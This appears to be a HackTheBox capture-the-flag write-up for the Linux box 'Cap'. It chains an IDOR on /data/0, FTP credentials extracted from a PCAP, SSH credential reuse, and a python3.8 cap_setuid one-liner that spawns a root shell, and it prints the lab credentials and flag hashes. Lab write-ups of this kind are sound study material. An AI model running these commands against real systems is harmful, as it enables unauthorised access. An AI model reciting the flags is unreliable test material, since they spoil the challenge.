# Cap | HackTheBox Writeup

**OS:** Linux | **Difficulty:** Easy | **Rooted:** 2026-04-29

**Techniques:** IDOR, FTP credential extraction from PCAP, Linux capability abuse (cap_setuid)

---

## Overview

Cap is an Easy Linux box that chains three distinct techniques. The web application exposes a network monitoring dashboard with a packet capture feature vulnerable to IDOR. Decrementing the capture ID to 0 retrieves a privileged session's PCAP containing plaintext FTP credentials. Those credentials reuse to SSH, and privilege escalation is achieved by abusing `cap_setuid` on Python 3.8.

---

## Enumeration

### Port Scan

```bash
nmap -p- --min-rate 1000 -oN Cap-all-ports.txt 10.129.26.15
ports=$(grep open Cap-all-ports.txt | cut -d '/' -f1 | tr '\n' ',' | sed 's/,$//')
nmap -p $ports -sC -sV --min-rate 1000 -oN Cap-service-scan.txt 10.129.26.15
```

| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | vsftpd 3.0.3 |
| 22 | SSH | OpenSSH 8.2p1 |
| 80 | HTTP | Gunicorn (Security Dashboard) |

### Web Application: IDOR

The dashboard serves packet captures at `/data/<id>`. The ID is a sequential integer with no ownership validation. Navigating to `/data/0` returns a capture from a prior privileged session.

```
http://10.129.26.15/data/0
```

Downloaded `0.pcap`.

---

## Foothold

### PCAP Analysis

Opened `0.pcap` in Wireshark, applied display filter `ftp`, and followed the TCP stream.

FTP transmits credentials as plaintext over port 21:

```
USER nathan
PASS Buck3tH4TF0RM3!
```

### SSH Access

```bash
ssh nathan@10.129.26.15
# password: Buck3tH4TF0RM3!
```

Credential reuse across FTP and SSH. Shell landed as `nathan`.

```bash
cat ~/user.txt
# 2c49d2eedc3084ab2357ae6e1e232f8f
```

---

## Privilege Escalation

### Linux Capabilities

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

`python3.8` carries `cap_setuid`, which allows the process to call `setuid()` and become any user including root.

### Exploitation

```bash
python3.8 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

Root shell obtained.

```bash
cat /root/root.txt
# 552527d143bc50662bf065fafa6b2ef2
```

---

## Attack Chain

```
IDOR on /data/0
    -> Download privileged PCAP
        -> Extract FTP creds (nathan:Buck3tH4TF0RM3!)
            -> SSH credential reuse
                -> cap_setuid on python3.8
                    -> root
```

---

## Key Takeaways

- IDOR on sequential numeric IDs is trivially exploitable. Always decrement to 0.
- FTP credentials are always plaintext. PCAP analysis is a standard credential extraction technique
- Credential reuse across services is extremely common. Test every found credential on every open port
- `getcap -r / 2>/dev/null` is a fast, high-value capability check. Run it early post-foothold.
- `cap_setuid` on any scripting language runtime is instant root via a one-liner

---

## Screenshots

| Step | File |
|------|------|
| Nmap all ports | `screenshots/01-nmap-all-ports.png` |
| Nmap service scan | `screenshots/02-nmap-service-scan.png` |
| Web dashboard | `screenshots/03-web-dashboard.png` |
| IDOR: /data/0 | `screenshots/04-idor-data-0.png` |
| Wireshark FTP stream | `screenshots/05-wireshark-ftp-stream.png` |
| SSH foothold | `screenshots/06-ssh-foothold.png` |
| User flag | `screenshots/07-user-flag.png` |
| getcap output | `screenshots/08-getcap-output.png` |
| Root shell | `screenshots/09-root-shell.png` |
| Root flag | `screenshots/10-root-flag.png` |

---

*Part of the [oscp-journey](https://github.com/mavhezha/oscp-journey) repo. TJ Null HTB list, Linux Phase L1.*
